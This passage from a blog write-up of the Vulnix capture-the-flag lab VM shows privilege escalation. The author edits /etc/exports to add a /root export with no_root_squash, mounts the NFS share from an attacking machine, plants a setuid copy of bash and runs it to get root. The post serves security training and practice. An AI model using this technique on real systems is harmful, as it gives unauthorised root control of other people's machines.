2016</span><br /><br /><span style="color: #888888;">  System load:  0.0              Processes:           89</span><br /><span style="color: #888888;">  Usage of /:   93.3% of 773MB   Users logged in:     0</span><br /><span style="color: #888888;">  Memory usage: 13%              IP address for eth0: 192.168.1.72</span><br /><span style="color: #888888;">  Swap usage:   0%</span><br /><br /><span style="color: #888888;">  =&gt; / is using 93.3% of 773MB</span><br /><br /><span style="color: #888888;">  Graph this data and manage this system at https://landscape.canonical.com/</span><br /><br /><span style="color: #888888;">New release '14.04.5 LTS' available.</span><br /><span style="color: #888888;">Run 'do-release-upgrade' to upgrade to it.</span><br /><br /><br /><span style="color: #888888;">The programs included with the Ubuntu system are free software;</span><br /><span style="color: #888888;">the exact distribution terms for each program are described in the</span><br /><span style="color: #888888;">individual files in /usr/share/doc/*/copyright.</span><br /><br /><span style="color: #888888;">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br /><span style="color: #888888;">applicable law.</span><br /><br /><span style="color: #c65d09; font-weight: bold;">vulnix@vulnix:~$</span> <br /></pre></td></tr></tbody></table></div></div><br /><h3 style="text-align: left;">2.3 Privilege Escalation P2 (ROOT!)</h3><div style="text-align: left;">I was very lucky to notice this straight away that running sudo -l shows that I'm allowed to edit /etc/exports. This way I can add an entry for the entire directory and do whatever I want.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Yet one problem stood in the way, how do I restart the VM so the changes take place? Not sure what other people think about this&nbsp; but unfortunately the author's walkthrough was to restart the VM. I'm very against this as in a pentest, I don't have access to the physical machine, if I can't reboot it with my current privilege, I won't be able to restart it.&nbsp;</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Also due to the fact that there's a secure_path set, we can't manipulate the PATH variable (except by running sudo -e which we can't).</div><div style="text-align: left;"><br /></div><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">vulnix@vulnix:~$</span> sudoedit /etc/exports <br /><span style="color: #000099; font-weight: bold;">vulnix@vulnix:~$</span> cat /etc/exports <br /><span style="color: #000099; font-weight: bold;">#</span> /etc/exports: the access control list <span style="color: #006699; font-weight: bold;">for </span>filesystems which may be exported<br /><span style="color: #000099; font-weight: bold;">#</span>  to NFS clients.  See exports<span style="color: #555555;">(</span>5<span style="color: #555555;">)</span>.<br /><span style="color: #000099; font-weight: bold;">#</span><br /><span style="color: #000099; font-weight: bold;">#</span> Example <span style="color: #006699; font-weight: bold;">for </span>NFSv2 and NFSv3:<br /><span style="color: #000099; font-weight: bold;">#</span> /srv/homes       hostname1<span style="color: #555555;">(</span>rw,sync,no_subtree_check<span style="color: #555555;">)</span> hostname2<span style="color: #555555;">(</span>ro,sync,no_subtree_check<span style="color: #555555;">)</span><br /><span style="color: #000099; font-weight: bold;">#</span><br /><span style="color: #000099; font-weight: bold;">#</span> Example <span style="color: #006699; font-weight: bold;">for </span>NFSv4:<br /><span style="color: #000099; font-weight: bold;">#</span> /srv/nfs4        gss/krb5i<span style="color: #555555;">(</span>rw,sync,fsid<span style="color: #555555;">=</span>0,crossmnt,no_subtree_check<span style="color: #555555;">)</span><br /><span style="color: #000099; font-weight: bold;">#</span> /srv/nfs4/homes  gss/krb5i<span style="color: #555555;">(</span>rw,sync,no_subtree_check<span style="color: #555555;">)</span><br /><span style="color: #000099; font-weight: bold;">#</span><br /><span style="color: #aaaaaa;">/home/vulnix *(rw,root_squash)</span><br /><span style="color: #aaaaaa;">/root  *(rw, no_root_squash)</span><br /><br /><span style="color: #000099; font-weight: bold;">vulnix@vulnix:~$</span> <br /></pre></td></tr></tbody></table></div><div style="text-align: left;"><br />Let's edit the file and update /home/vulnix so we're able to </div><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16</pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">vulnix@vulnix:~$</span> sudoedit /etc/exports <br /><span style="color: #000099; font-weight: bold;">vulnix@vulnix:~$</span> cat /etc/exports <br /><span style="color: #000099; font-weight: bold;">#</span> /etc/exports: the access control list <span style="color: #006699; font-weight: bold;">for </span>filesystems which may be exported<br /><span style="color: #000099; font-weight: bold;">#</span>  to NFS clients.  See exports<span style="color: #555555;">(</span>5<span style="color: #555555;">)</span>.<br /><span style="color: #000099; font-weight: bold;">#</span><br /><span style="color: #000099; font-weight: bold;">#</span> Example <span style="color: #006699; font-weight: bold;">for </span>NFSv2 and NFSv3:<br /><span style="color: #000099; font-weight: bold;">#</span> /srv/homes       hostname1<span style="color: #555555;">(</span>rw,sync,no_subtree_check<span style="color: #555555;">)</span> hostname2<span style="color: #555555;">(</span>ro,sync,no_subtree_check<span style="color: #555555;">)</span><br /><span style="color: #000099; font-weight: bold;">#</span><br /><span style="color: #000099; font-weight: bold;">#</span> Example <span style="color: #006699; font-weight: bold;">for </span>NFSv4:<br /><span style="color: #000099; font-weight: bold;">#</span> /srv/nfs4        gss/krb5i<span style="color: #555555;">(</span>rw,sync,fsid<span style="color: #555555;">=</span>0,crossmnt,no_subtree_check<span style="color: #555555;">)</span><br /><span style="color: #000099; font-weight: bold;">#</span> /srv/nfs4/homes  gss/krb5i<span style="color: #555555;">(</span>rw,sync,no_subtree_check<span style="color: #555555;">)</span><br /><span style="color: #000099; font-weight: bold;">#</span><br /><span style="color: #aaaaaa;">/home/vulnix *(rw,root_squash)</span><br /><span style="color: #aaaaaa;">/root  *(rw, no_root_squash)</span><br /><br /><span style="color: #000099; font-weight: bold;">vulnix@vulnix:~$</span> <br /></pre></td></tr></tbody></table></div><div style="text-align: left;"><br />Restart the VM and remount the shared directory. We can upload a local exploit to gain root, or just copy /bin/bash and give it setuid permissions.<br /><br />We'll run bash with -p flag to keep the original file's permissions.<br /><br /></div></div><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><table><tbody><tr><td><pre style="line-height: 125%; margin: 0;"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br /></pre></td><td><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp#</span> mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt<br /><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp#</span> <span style="color: #007722;">cd </span>mnt<br /><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp/mnt#</span> cp /bin/bash .<br /><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp/mnt#</span> chmod 4777 bash<br /><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp/mnt#</span> ls -al<br /><span style="color: #888888;">total 1180</span><br /><span style="color: #888888;">drwxr-x---  5 vulnix vulnix    4096 Oct 31 00:41 .</span><br /><span style="color: #888888;">drwxrwxrwt 12 root   root      4096 Oct 31 00:39 ..</span><br /><span style="color: #888888;">-rwsrwxrwx  1 root   root   1171072 Oct 31 00:41 bash</span><br /><span style="color: #888888;">-rw-------  1 vulnix vulnix       0 Oct 31 00:31 .bash_history</span><br /><span style="color: #888888;">-rw-r--r--  1 vulnix vulnix     220 Apr  3  2012 .bash_logout</span><br /><span style="color: #888888;">-rw-r--r--  1 vulnix vulnix    3486 Apr  3  2012 .bashrc</span><br /><span style="color: #888888;">drwx------  2 vulnix vulnix    4096 Oct 31 00:09 .cache</span><br /><span style="color: #888888;">-rw-r--r--  1 vulnix vulnix     675 Apr  3  2012 .profile</span><br /><span style="color: #888888;">drwxr-xr-x  2 vulnix vulnix    4096 Oct 31 00:09 .ssh</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:/tmp/mnt#</span> ssh vulnix@192.168.1.72<br /><span style="color: #888888;">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br /><br /><span style="color: #888888;"> * Documentation:  https://help.ubuntu.com/</span><br /><br /><span style="color: #888888;">  System information as of Mon Oct 31 04:41:47 GMT 2016</span><br /><br /><span style="color: #888888;">  System load:  0.0              Processes:           90</span><br /><span style="color: #888888;">  Usage of /:   93.5% of 773MB   Users logged in:     0</span><br /><span style="color: #888888;">  Memory usage: 7%               IP address for eth0: 192.168.1.72</span><br /><span style="color: #888888;">  Swap usage:   0%</span><br /><br /><span style="color: #888888;">  =&gt; / is using 93.5% of 773MB</span><br /><br /><span style="color: #888888;">  Graph this data and manage this system at https://landscape.canonical.com/</span><br /><br /><span style="color: #888888;">New release '14.04.5 LTS' available.</span><br /><span style="color: #888888;">Run 'do-release-upgrade' to upgrade to it.</span><br /><br /><span style="color: #888888;">Last login: Mon Oct 31 04:31:08 2016 from 192.168.1.71</span><br /><span style="color: #c65d09; font-weight: bold;">vulnix@vulnix:~$</span> ls -al<br /><span style="color: #888888;">total 1180</span><br /><span style="color: #888888;">drwxr-x--- 5 vulnix vulnix    4096 Oct 31 04:41 .</span><br /><span style="color: #888888;">drwxr-xr-x 4 root   root      4096 Sep  2  2012 ..</span><br /><span style="color: #888888;">-rwsrwxrwx 1 root   root   1171072 Oct 31 04:41 bash</span><br /><span style="color: #888888;">-rw------- 1 vulnix vulnix       0 Oct 31 04:31 .bash_history</span><br /><span style="color: #888888;">-rw-r--r-- 1 vulnix vulnix     220 Apr  3  2012 .bash_logout</span><br /><span style="color: #888888;">-rw-r--r-- 1 vulnix vulnix    3486 Apr  3  2012 .bashrc</span><br /><span style="color: #888888;">drwx------ 2 vulnix vulnix    4096 Oct 31 04:09 .cache</span><br /><span style="color: #888888;">-rw-r--r-- 1 vulnix vulnix     675 Apr  3  2012 .profile</span><br /><span style="color: #888888;">drwxr-xr-x 2 vulnix vulnix    4096 Oct 31 04:09 .ssh</span><br /><span style="color: #c65d09; font-weight: bold;">vulnix@vulnix:~$</span> ./bash -p<br /><span style="color: #888888;">./bash: /lib/i386-linux-gnu/libtinfo.so.5: no version information available (required by ./bash)</span><br /><span style="color: #888888;">bash-4.4# whoami</span><br /><span style="color: #888888;">root</span><br /><span style="color: #888888;">bash-4.4# ls /root</span><br /><span style="color: #888888;">trophy.txt</span><br /><span style="color: #888888;">bash-4.4# cat /root/trophy.txt </span><br /><span style="color: #888888;">cc614640424f5bd60ce5d5264899c3be</span><br /><span style="color: #888888;">bash-4.4# </span><br /></pre></td></tr></tbody></table></div><br />This VM isn't the easiest, I wasn't able to find about user 'user' due to missing SMTP enumeration. Also the trick where I needed to restart the VM stalled me for a long time. Still a pretty fun challenge. <br /><h4 style="text-align: left;">Final notes&nbsp;</h4><ul style="text-align: left;"><li>Enumeration is important, without knowing there's a user called user you most likely won't be able to solve this VM. Doesn't matter which service you use, you can enumerate SMTP, Finger, NFS, ...</li><li>Restarting the VM shouldn't be done via the VMware (or whatever software you use), unless you can reboot the VM with the current privileges, that should be out of question.</li></ul><br /><i>Currently listening to <a href="https://www.youtube.com/watch?v=Lyz4eqzgWKg">Ghost Bath - Golden Number </a></i><br />Abatchy </div></div>